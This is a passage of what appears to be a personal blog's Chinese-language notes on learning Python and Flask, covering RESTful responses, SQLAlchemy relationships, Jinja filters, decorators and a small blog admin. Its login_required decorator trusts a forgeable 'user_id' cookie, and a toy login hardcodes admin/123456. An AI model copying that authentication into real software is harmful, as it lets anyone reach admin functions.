class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;post请求&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-RESTful</span></span><br><span class="line">ret_field = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;like&#x27;</span>: fields.String(default=<span class="string">&#x27;ball&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;data2&#x27;</span>: fields.String(attribute=<span class="string">&#x27;data&#x27;</span>) <span class="comment">#类似于引用，将data的值给一个另外名字的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserResource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field</span>)     </span><span class="comment">#flask的一个拓展，用以规范后端返回数据的格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;千峰教育Python&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_fields = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: fields.Url(endpoint=<span class="string">&#x27;id&#x27;</span>, absolute=<span class="literal">True</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret_field2 = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.Nested(user_fields)  <span class="comment">#获取一个列表数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field2</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        user = User.query.first()   <span class="comment">#从数据库中拿出数据</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: user</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解析  完成前端数据的返回</span></span><br><span class="line">parser = reqparse.RequestParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;name&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;name是必须的&#x27;</span>)   </span><br><span class="line">parser.add_argument(<span class="string">&#x27;age&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, action=<span class="string">&#x27;append&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User4Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        age = args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;age&#x27;</span>: age&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="八、数据表之间的操作"><a href="#八、数据表之间的操作" class="headerlink" title="八、数据表之间的操作"></a>八、数据表之间的操作</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一对多</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grade</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;grade&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#建立关联</span></span><br><span class="line">    <span class="comment">#定义班级表的一对多关系，不是字段，Student为学生表模型，backref为反向查找名称</span></span><br><span class="line">    students = db.relationship(<span class="string">&#x27;Student&#x27;</span>, backref=<span class="string">&#x27;grade&#x27;</span>, lazy=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;student&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">    <span class="comment">#创建外键，关联到班级表的主键，实现一对多关系，班级表中也要有对应操作</span></span><br><span class="line">    gradeid = db.Column(db.Integer, db.ForeignKey(Grade.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多对多    </span></span><br><span class="line"><span class="comment">#中间表（不是类）    </span></span><br><span class="line">collect = db.Table(</span><br><span class="line">    <span class="string">&#x27;collects&#x27;</span>,</span><br><span class="line">    <span class="comment">#user_id为表字段名称，user.id未外键表的id</span></span><br><span class="line">    db.Column(<span class="string">&#x27;user_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;usermodel.id&#x27;</span>), primary_key=<span class="literal">True</span>),</span><br><span class="line">    db.Column(<span class="string">&#x27;movie_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;movie.id&#x27;</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModel</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;usermodel&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;movie&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#多对多  关联的学生摆个的模型   中间表的名称   反向查找</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;UserModel&#x27;</span>, backref=<span class="string">&#x27;movies&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>, secondary=collect)</span><br></pre></td></tr></table></figure>
-
-<p>lazy属性</p>
-<blockquote>
-<p>dynamic：    会返回一个query对象(查询集)，可以继续使用其他查询方法，如all()</p>
-<p>select：    首次访问到属性的时候，就会加载该属性的数据</p>
-<p>joined：    在对关联的两个表进行join操作，从而获取到所有相关的对象</p>
-<p>True：    返回一个可用的列表对象，同select</p>
-</blockquote>
-<h1 id="九、前端页面渲染的一些函数操作"><a href="#九、前端页面渲染的一些函数操作" class="headerlink" title="九、前端页面渲染的一些函数操作"></a>九、前端页面渲染的一些函数操作</h1><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>capitalize</td>
-<td>首字母大写</td>
-</tr>
-<tr>
-<td>upper</td>
-<td>全部大写</td>
-</tr>
-<tr>
-<td>lower</td>
-<td>全部小写</td>
-</tr>
-<tr>
-<td>title</td>
-<td>每个单词首字母大写</td>
-</tr>
-<tr>
-<td>trim</td>
-<td>去掉两边的空白</td>
-</tr>
-<tr>
-<td>striptags</td>
-<td>去掉所有的HTML标签</td>
-</tr>
-<tr>
-<td>safe</td>
-<td>即删除标签，又保留标签功能</td>
-</tr>
-</tbody></table>
-<p>我们就可以在html页面中去使用</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123; name|capitalize &#125;&#125; ! <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样就可以去便利我们对参数的使用</p>
-<h1 id="十、实践操作–个人简易博客的搭建"><a href="#十、实践操作–个人简易博客的搭建" class="headerlink" title="十、实践操作–个人简易博客的搭建"></a>十、实践操作–个人简易博客的搭建</h1><h2 id="1、更加清晰分明的文件结构："><a href="#1、更加清晰分明的文件结构：" class="headerlink" title="1、更加清晰分明的文件结构："></a>1、更加清晰分明的文件结构：</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/650f1da2ad366d5775354e62a0abfe6f--661f--image-20231125193419163.png" alt="image-20231125193419163"></p>
-<p>由于需要有前端显示和后端管理两个层面，所以将视图文件，模板文件，以及静态文件分为两个，并且专门创建了一个文件夹去存放，这样就能去更清晰的去文件分类。</p>
-<h2 id="2、代码编写中的一些知识学习"><a href="#2、代码编写中的一些知识学习" class="headerlink" title="2、代码编写中的一些知识学习"></a>2、代码编写中的一些知识学习</h2><h3 id="1-装饰器的使用"><a href="#1-装饰器的使用" class="headerlink" title="1)装饰器的使用"></a>1)装饰器的使用</h3><p>对登录界面使用装饰器进行简化，并且解决flask中使用两次同个装饰器的报错。</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="comment">#装饰器 ---登入验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">fn</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">fn</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        user_id = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user_id:</span><br><span class="line">            user = AdminUserModel.query.get(user_id)</span><br><span class="line">            request.user = user</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin/login/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-前端js代码的修改"><a href="#2-前端js代码的修改" class="headerlink" title="2)前端js代码的修改"></a>2)前端js代码的修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#main table tbody tr td a&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> that = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> id = that.<span class="title function_">attr</span>(<span class="string">&quot;aid&quot;</span>);  <span class="comment">//对应id</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">srcElement</span>.<span class="property">outerText</span> == <span class="string">&quot;删除&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;此操作不可逆，是否确认？&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                $.<span class="title function_">post</span>(<span class="string">&#x27;/admin/delarticle/&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: id&#125;, <span class="keyword">function</span> (<span class="params">data</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    <span class="keyword">if</span>(data.<span class="property">code</span> == <span class="number">200</span>)&#123;</span><br><span class="line">                        location.<span class="title function_">reload</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@admin.route(<span class="params"><span class="string">&#x27;/admin/delarticle/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_del_article</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        article = ArticleModel.query.get(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.delete(article)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>, e)</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除失败！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">400</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;请求方式错误！&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>进行前后端的数据交互，通过判断请求方法区决定不同的操作对于路由而言，从而去实现不同的功能，这里就是去利用了json数据与前端的交互，从而完成了页面相应和后台数据的关联。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>flask</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python学习历程(1)</title>
-    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
-    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
-<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
-<span id="more"></span>
-
-<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>
-
-<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
-<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
-<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
-<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
-<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>
-
-<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>
-
-<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
-<p><strong>取自python官方文档</strong></p>
-<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
-<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>
-
-<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
-<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span 